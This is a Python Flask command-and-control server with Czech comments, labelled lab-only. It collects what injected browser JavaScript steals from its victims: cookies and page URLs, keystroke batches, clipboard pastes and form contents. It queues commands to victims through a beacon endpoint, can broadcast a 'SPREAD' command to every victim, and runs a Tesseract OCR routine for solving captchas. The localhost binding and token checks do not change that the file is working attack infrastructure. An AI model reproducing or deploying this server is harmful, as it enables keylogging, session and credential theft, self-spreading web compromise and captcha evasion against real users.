#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C2 / sběrný server (LAB-ONLY) pro výzkumný PoC.

Bezpečnostní vlastnosti této sanitizované verze:
  * BIND na 127.0.0.1 (default) — server NENÍ dosažitelný z internetu.
  * Řídicí a výstupní endpointy (/ , /export, /spread, /cmd) vyžadují TOKEN.
    Token se vygeneruje automaticky při startu (nebo nastav C2_TOKEN env).
  * /solve (OCR captchy) má rate-limit na IP.
  * Žádná vazba na konkrétní web — payload si adresu C2 nese sám.

Spuštění:
    pip install flask pillow numpy
    python3 c2.py
    # → vypíše TOKEN, který používej v dashboardu a pro řízení

Endpointy pro injektovaný JS (lab payload):
    GET /hello?vid=&co=&u=   -> registrace session
    GET /k?k=<batch>         -> keylogger (batch)
    GET /p?p=<paste>         -> schránka
    GET /f?d=<form>          -> formulář
    GET /beacon?vid=...      -> heartbeat + příkaz (JSON)
    GET /solve?img=<b64>     -> OCR captchy -> {digits, sum}

Chráněné (token):
    GET /                    -> dashboard
    GET /export              -> JSON dump
    GET /spread?token=       -> SPREAD všem obětem
    GET /cmd?vid=&cmd=&token=

Data: SQLite c2.sqlite3 (lokální soubor).
"""
import os
import io
import json
import time
import base64
import sqlite3
import secrets
import functools
import subprocess
from collections import Counter, defaultdict

import numpy as np
from PIL import Image, ImageOps
from flask import Flask, request, jsonify, Response

BIND = os.environ.get("C2_BIND", "127.0.0.1")   # LAB default: pouze localhost
PORT = int(os.environ.get("C2_PORT", "8080"))
TOKEN = os.environ.get("C2_TOKEN") or secrets.token_hex(8)

DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2.sqlite3")
app = Flask(__name__)

# ---------------------------------------------------------------- rate limit
_RL = defaultdict(list)
def rate_ok(ip, limit=30, window=60):
    now = time.time()
    q = _RL[ip]
    while q and now - q[0] > window:
        q.pop(0)
    if len(q) >= limit:
        return False
    q.append(now)
    return True

# ---------------------------------------------------------------------- auth
def protected(fn):
    @functools.wraps(fn)
    def w(*a, **kw):
        t = request.args.get("token") or request.headers.get("X-C2-Token", "")
        if not secrets.compare_digest(str(t), TOKEN):
            return jsonify({"error": "unauthorized"}), 401
        return fn(*a, **kw)
    return w

@app.after_request
def cors(resp):
    # Lab: payload na lab.local volá XHR na C2 (cross-origin). Omez v produkci.
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

# ------------------------------------------------------------------------ DB
def db():
    c = sqlite3.connect(DB, timeout=15)
    c.row_factory = sqlite3.Row
    c.execute("PRAGMA journal_mode=WAL")
    return c

def init_db():
    c = db()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS victims(
            vid TEXT PRIMARY KEY, first_seen REAL, last_seen REAL,
            ip TEXT, ua TEXT, url TEXT, cookies TEXT, spread_count INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS events(
            id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, vid TEXT, kind TEXT, data TEXT);
        CREATE TABLE IF NOT EXISTS cmds(
            id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL, vid TEXT, cmd TEXT,
            done INTEGER DEFAULT 0, done_ts REAL);
    """)
    c.commit(); c.close()

init_db()

def log_event(vid, kind, data):
    c = db()
    c.execute("INSERT INTO events(ts,vid,kind,data) VALUES(?,?,?,?)",
              (time.time(), vid, kind, data))
    c.commit(); c.close()

def upsert_victim(vid, ip, ua, url=None, cookies=None, spread=False):
    c = db(); now = time.time()
    if c.execute("SELECT vid FROM victims WHERE vid=?", (vid,)).fetchone() is None:
        c.execute("INSERT INTO victims(vid,first_seen,last_seen,ip,ua,url,cookies,spread_count)"
                  " VALUES(?,?,?,?,?,?,?,?)",
                  (vid, now, now, ip, ua, url, cookies, 1 if spread else 0))
    else:
        c.execute("UPDATE victims SET last_seen=?, ip=?, ua=?,"
                  " url=COALESCE(?,url), cookies=COALESCE(?,cookies),"
                  " spread_count=spread_count+? WHERE vid=?",
                  (now, ip, ua, url, cookies, 1 if spread else 0, vid))
    c.commit(); c.close()

def queue_cmd(vid, cmd):
    c = db()
    c.execute("INSERT INTO cmds(ts,vid,cmd,done) VALUES(?,?,?,0)", (time.time(), vid, cmd))
    c.commit(); c.close()

def pop_cmd(vid):
    c = db()
    row = c.execute("SELECT id,cmd FROM cmds WHERE vid=? AND done=0 ORDER BY id LIMIT 1",
                    (vid,)).fetchone()
    if row:
        c.execute("UPDATE cmds SET done=1, done_ts=? WHERE id=?", (time.time(), row["id"]))
        c.commit(); c.close()
        return row["cmd"]
    c.close(); return None

# --------------------------------------------------------------- captcha OCR
def _mask(im):
    a = np.asarray(im.convert("RGB")).astype(np.int16)
    return (a[:, :, 0] > 130) & (a[:, :, 1] > 130) & (a[:, :, 2] > 130)

def _col_groups(colsum, gap=0, minw=3):
    g, s, l = [], None, None
    for x, v in enumerate(colsum):
        if v > 0:
            if s is None: s = x
            l = x
        else:
            if s is not None and x - l > gap:
                g.append((s, l)); s = l = None
    if s is not None: g.append((s, l))
    return [x for x in g if x[1] - x[0] + 1 >= minw]

def _force_four(colsum, groups, n=4):
    while len(groups) > n:
        i = min(range(len(groups) - 1), key=lambda k: groups[k + 1][0] - groups[k][1])
        groups = groups[:i] + [(groups[i][0], groups[i + 1][1])] + groups[i + 2:]
    while len(groups) < n:
        i = max(range(len(groups)), key=lambda k: groups[k][1] - groups[k][0])
        a, b = groups[i]
        if b - a < 2: break
        seg = colsum[a:b + 1]
        off = int(np.argmin(seg[1:-1])) + 1 if len(seg) > 2 else len(seg) // 2
        groups = groups[:i] + [(a, a + off - 1), (a + off, b)] + groups[i + 1:]
    return groups

def _one_digit(sub):
    votes = Counter()
    for h in (30, 35, 40, 45, 50, 70):
        for psm in ("7", "8", "10", "13"):
            for invert in (True, False):
                w = max(8, int(round(h * sub.shape[1] / sub.shape[0])))
                img = Image.fromarray((sub.astype(np.uint8) * 255)).resize((w, h), Image.LANCZOS)
                if invert: img = ImageOps.invert(img)
                img = ImageOps.expand(img, border=15, fill=255 if invert else 0)
                img.save("/tmp/_c2cell.png")
                out = subprocess.run(
                    ["tesseract", "/tmp/_c2cell.png", "stdout", "--psm", psm,
                     "-c", "tessedit_char_whitelist=0123456789"],
                    capture_output=True, text=True).stdout
                d = "".join(ch for ch in out if ch.isdigit())
                if d: votes[d[0]] += 1
    return votes.most_common(1)[0][0] if votes else None

def solve_captcha(img_bytes):
    mask = _mask(Image.open(io.BytesIO(img_bytes)))
    colsum = mask.sum(axis=0)
    groups = _force_four(colsum, _col_groups(colsum), 4)
    digs = [_one_digit(mask[:, a:b + 1]) for (a, b) in groups[:4]]
    s = "".join(d if d else "?" for d in digs)
    f2 = [int(c) for c in s[:2] if c.isdigit()]
    return s, (sum(f2) if len(f2) == 2 else None)

# ------------------------------------------------- collector (otevřené, lab)
@app.route("/hello")
def hello():
    vid = request.args.get("vid") or (request.remote_addr or "unknown")
    upsert_victim(vid, request.remote_addr or "?", request.headers.get("User-Agent", ""),
                  url=request.args.get("u"), cookies=request.args.get("co"))
    log_event(vid, "hello", json.dumps({"co": request.args.get("co"),
                                        "u": request.args.get("u")}, ensure_ascii=False))
    return "", 204

@app.route("/k")
def keylog():
    log_event(request.args.get("vid", "?"), "keys", request.args.get("k", ""))
    return "", 204

@app.route("/p")
def paste():
    log_event(request.args.get("vid", "?"), "paste", request.args.get("p", ""))
    return "", 204

@app.route("/f")
def form():
    log_event(request.args.get("vid", "?"), "form", request.args.get("d", ""))
    return "", 204

@app.route("/beacon")
def beacon():
    vid = request.args.get("vid", "?")
    upsert_victim(vid, request.remote_addr or "?", request.headers.get("User-Agent", ""),
                  url=request.args.get("u"), cookies=request.args.get("co"))
    return jsonify({"cmd": pop_cmd(vid), "ts": time.time()})

@app.route("/task")
def task():
    return jsonify({"cmd": pop_cmd(request.args.get("vid", "?"))})

@app.route("/solve")
def solve():
    ip = request.remote_addr or "?"
    if not rate_ok(ip, limit=30, window=60):
        return jsonify({"error": "rate limited"}), 429
    raw = request.args.get("img", "")
    if "," in raw: raw = raw.split(",", 1)[1]
    try:
        digits, total = solve_captcha(base64.b64decode(raw))
        return jsonify({"digits": digits, "sum": total})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

# ------------------------------------------------- control (token-protected)
@app.route("/spread")
@protected
def spread():
    c = db()
    rows = c.execute("SELECT vid FROM victims").fetchall()
    for r in rows: queue_cmd(r["vid"], "SPREAD")
    c.close()
    return jsonify({"queued": len(rows), "cmd": "SPREAD"})

@app.route("/cmd")
@protected
def cmd():
    vid, val = request.args.get("vid", ""), request.args.get("cmd", "")
    if not vid or not val:
        return jsonify({"error": "vid a cmd jsou povinné"}), 400
    queue_cmd(vid, val)
    return jsonify({"ok": True, "vid": vid, "cmd": val})

@app.route("/export")
@protected
def export():
    c = db()
    v = [dict(r) for r in c.execute("SELECT * FROM victims").fetchall()]
    e = [dict(r) for r in c.execute("SELECT * FROM events ORDER BY id").fetchall()]
    c.close()
    return jsonify({"victims": v, "events": e})

@app.route("/")
@protected
def dashboard():
    c = db()
    victims = c.execute("SELECT * FROM victims ORDER BY last_seen DESC").fetchall()
    events = c.execute("SELECT * FROM events ORDER BY id DESC LIMIT 200").fetchall()
    c.close()
    rows = "".join(
        "<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>"
        .format(v["vid"][:14], _t(v["first_seen"]), _t(v["last_seen"]),
                (v["ip"] or "")[:15], (v["ua"] or "")[:40],
                (v["cookies"] or "")[:30], v["spread_count"]) for v in victims)
    ev = "".join(
        "<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>".format(
            _t(e["ts"]), (e["vid"] or "")[:14], e["kind"],
            (e["data"] or "")[:90].replace("<", "&lt;")) for e in events)
    html = f"""<!doctype html><meta charset=utf-8><title>C2 lab dashboard</title>
<style>body{{font:13px monospace;background:#111;color:#0f0;padding:16px}}
table{{border-collapse:collapse;margin:10px 0}}td,th{{border:1px solid #333;padding:3px 6px}}
h2{{color:#6cf}}a{{color:#fd0}}</style>
<h1>LAB C2 — token-protected</h1>
<p><a href="/export?token={TOKEN}">export JSON</a> |
<a href="/spread?token={TOKEN}">SPREAD všem obětem</a></p>
<h2>Oběti ({len(victims)})</h2><table>
<tr><th>vid</th><th>first</th><th>last</th><th>ip</th><th>ua</th><th>cookie</th><th>spread</th></tr>
{rows}</table>
<h2>Události (posledních 200)</h2><table>
<tr><th>ts</th><th>vid</th><th>kind</th><th>data</th></tr>{ev}</table>"""
    return Response(html, mimetype="text/html")

def _t(ts):
    try: return time.strftime("%H:%M:%S", time.localtime(ts))
    except Exception: return ""

if __name__ == "__main__":
    print(f"[*] C2 (LAB-ONLY) běží na http://{BIND}:{PORT}")
    print(f"[*] TOKEN: {TOKEN}")
    print(f"[*] dashboard: http://127.0.0.1:{PORT}/?token={TOKEN}")
    app.run(host=BIND, port=PORT, threaded=True)
